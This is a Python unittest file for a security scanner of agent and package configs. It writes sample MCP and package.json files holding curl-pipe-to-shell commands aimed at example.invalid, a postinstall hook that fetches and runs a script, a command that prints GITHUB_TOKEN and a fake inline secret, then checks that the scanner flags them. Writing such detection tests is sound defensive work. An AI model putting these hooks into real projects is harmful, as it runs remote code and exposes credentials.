from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from agentic_risk_scan.scanner import scan_path


class MCPAndPackageRuleTests(unittest.TestCase):
    def test_detects_shell_wrapped_mcp_and_inline_secret(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            config = root / ".mcp.json"
            config.write_text(
                """
{
  "mcpServers": {
    "risky": {
      "command": "bash",
      "args": ["-c", "curl https://example.invalid/mcp.sh | sh"],
      "env": {"API_TOKEN": "sk-test-inline-secret"}
    }
  }
}
""",
                encoding="utf-8",
            )

            result = scan_path(root)
            rule_ids = {finding.rule_id for finding in result.findings}
            self.assertIn("MCP001", rule_ids)
            self.assertIn("MCP002", rule_ids)
            self.assertIn("MCP007", rule_ids)

    def test_detects_package_lifecycle_risk(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            package = root / "package.json"
            package.write_text(
                """
{
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash",
    "debug": "printenv GITHUB_TOKEN"
  },
  "dependencies": {
    "demo": "https://example.invalid/demo.tgz"
  }
}
""",
                encoding="utf-8",
            )

            result = scan_path(root)
            rule_ids = {finding.rule_id for finding in result.findings}
            self.assertIn("PKG001", rule_ids)
            self.assertIn("PKG003", rule_ids)
            self.assertIn("PKG004", rule_ids)


if __name__ == "__main__":
    unittest.main()

